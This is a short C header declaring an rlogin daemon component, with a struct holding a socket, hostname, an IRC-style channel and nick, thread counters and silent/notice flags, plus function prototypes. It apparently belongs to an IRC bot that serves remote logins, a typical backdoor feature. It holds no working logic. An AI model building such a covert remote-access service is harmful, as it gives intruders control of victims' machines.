#ifndef NO_RLOGIND

#define PERMISSION_DENIED_MSG "Permission denied\n"

typedef struct RLOGIND 
{
	SOCKET sock;
	char hostname[MAXHOSTNAME];
	char chan[MAXCHANLEN];
	char username[MAXNICKLEN];
	unsigned short port;
	int threadnum;
	int cthreadnum;
	BOOL insecure;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} RLOGIND;

static BOOL GetStr(SOCKET Socket, char *buffer, int cnt);
static BOOL CtrlHandler(DWORD CtrlType);
static BOOL CheckLogin(char *RemoteUser, char *RemoteHost, char *LocalUser, unsigned long ClientAddr);
DWORD WINAPI RlogindClientThread(LPVOID param);
DWORD WINAPI RlogindThread(LPVOID param);
#endif